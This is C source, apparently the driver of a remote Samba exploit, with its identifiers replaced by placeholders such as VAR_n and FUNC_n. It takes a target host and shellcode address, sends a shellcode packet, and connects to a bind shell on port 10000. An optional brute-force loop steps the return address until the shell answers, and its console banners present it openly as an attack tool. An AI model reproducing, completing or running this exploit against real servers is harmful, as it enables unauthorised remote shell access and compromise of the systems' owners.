
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_2__ TYPE_1__ ;


typedef int u_long ;
typedef int tg_host ;
struct TYPE_2__ {int shell; char* ost; } ;


 int VAR_0 ;
 int VAR_1 ;
 int VAR_2 ;
 int FUNC_0 (int,int) ;
 int FUNC_1 (char*) ;
 int FUNC_2 () ;
 int FUNC_3 (int) ;
 int FUNC_4 (int) ;
 int FUNC_5 (int ) ;
 int FUNC_6 (int ,char*,...) ;
 int FUNC_7 (int,char**,char*) ;
 int FUNC_8 (char*,int ,int) ;
 TYPE_1__* VAR_3 ;
 scalar_t__ FUNC_9 (int,int) ;
 int FUNC_10 (int) ;
 scalar_t__ FUNC_11 (char*,int) ;
 int FUNC_12 (int) ;
 int VAR_4 ;
 int VAR_5 ;
 int FUNC_13 (char*,char*,int) ;
 int FUNC_14 (char*,int ,int ) ;
 int FUNC_15 (char*) ;

int FUNC_16(int VAR_6,char *VAR_7[])
{
 int VAR_8,VAR_9,VAR_10=0,VAR_11=0;
 char VAR_12[0x82]="localhost";
 u_long VAR_13=VAR_3[VAR_10].shell;

 (void)FUNC_2();
 if(VAR_6<2)
 {
  (void)FUNC_15(VAR_7[0]);
 }

 while((VAR_9=FUNC_7(VAR_6,VAR_7,"H:h:S:s:T:t:IiB:b"))!=-1)
 {
  extern char *VAR_14;
  switch(VAR_9)
  {
   case 'H':
   case 'h':
    FUNC_8((char *)VAR_12,0,sizeof(VAR_12));
    FUNC_13(VAR_12,VAR_14,sizeof(VAR_12)-1);
    break;

   case 'S':
   case 's':
    VAR_13=FUNC_14(VAR_14,0,0);
    break;

   case 'T':
   case 't':
    if((VAR_10=FUNC_1(VAR_14))>1)
    {
     (void)FUNC_15(VAR_7[0]);
    }
    else VAR_13=VAR_3[VAR_10].shell;
    break;

   case 'I':
   case 'i':
    (void)FUNC_15(VAR_7[0]);
    break;

   case 'B':
   case 'b':
    VAR_11++;
    break;

   case '?':
    FUNC_6(VAR_4," Try `%s -i' for more information.\n\n",VAR_7[0]);
    FUNC_4(-1);
    break;
  }
 }
 if(VAR_11)
 {
  FUNC_6(VAR_5," **\n ** OK, It's good selection, Attack tries %d times.\n",VAR_1);
  FUNC_6(VAR_5," ** If work process is boring, drink coffee and wait. hehe ;-D\n **\n\n");
  FUNC_6(VAR_5," [*] Brute-Force mode:\n\n");
  FUNC_6(VAR_5," |----+----+----+----+----+----+----+----+----+----+----+----+----|");
  FUNC_6(VAR_5,"\n |");

  for(VAR_11=0;VAR_11<VAR_1;VAR_11++)
  {
   FUNC_5(VAR_5);
   FUNC_6(VAR_5,"=");

   VAR_13+=(0x100);
   VAR_8=(int)FUNC_11(VAR_12,VAR_0);

   if((int)FUNC_9(VAR_8,0)==-1)
   {
    while(!(VAR_11>=VAR_1-1))
    {
     FUNC_6(VAR_5,"=");
     VAR_11++;
    }
    FUNC_6(VAR_5,"|\n\n");
    FUNC_6(VAR_4," [-] Connect Failed.\n\n");
    FUNC_4(-1);
   }

   FUNC_0(VAR_8,VAR_13);
   FUNC_3(VAR_8);
   FUNC_12(2);
   VAR_8=(int)FUNC_11(VAR_12,VAR_2);

   if((int)FUNC_9(VAR_8,0)==-1)
   {
    continue;
   }

   while(!(VAR_11>=VAR_1-1))
   {
    FUNC_6(VAR_5,"=");
    VAR_11++;
   }

   FUNC_6(VAR_5,"|\n\n");
   FUNC_6(VAR_5," [+] Shellcode address: %d\n",VAR_13);
   FUNC_6(VAR_5," [*] Brute-Force end !!\n\n");
   FUNC_6(VAR_5," **\n ** Bind shellcode is port 10000.\n");
   FUNC_6(VAR_5," ** If bindshell port number was changed, change connection port.\n **\n\n");

   (void)FUNC_10(VAR_8);
  }

  FUNC_6(VAR_5,"|\n\n **\n");
  FUNC_6(VAR_5," ** Brute-Force exploit failed. Reason is simple.\n **\n");
  FUNC_6(VAR_5," ** Could not search shellcode's position during %d times.\n",VAR_1);
  FUNC_6(VAR_5," ** Or, Operating System's target that we attack isn't.\n");
  FUNC_6(VAR_5," ** OOops ! is server Samba version doubtful ??\n **\n\n");
  FUNC_4(-1);
 }
 else
 {
  FUNC_6(VAR_5," [0] Target: %s\n",VAR_3[VAR_10].ost);
  FUNC_6(VAR_5," [1] Set socket.\n");
  VAR_8=(int)FUNC_11(VAR_12,VAR_0);
  (int)FUNC_9(VAR_8,1);

  FUNC_6(VAR_5," [2] Make shellcode & Send Packet.\n");
  FUNC_0(VAR_8,VAR_13);
  FUNC_3(VAR_8);

  FUNC_6(VAR_5," [3] Trying %s:%d.\n",VAR_12,VAR_2);
  FUNC_12(2);

  VAR_8=(int)FUNC_11(VAR_12,VAR_2);
  (int)FUNC_9(VAR_8,1);

  FUNC_6(VAR_5," [*] Connected to %s:%d.\n",VAR_12,VAR_2);
  (void)FUNC_10(VAR_8);
 }
}
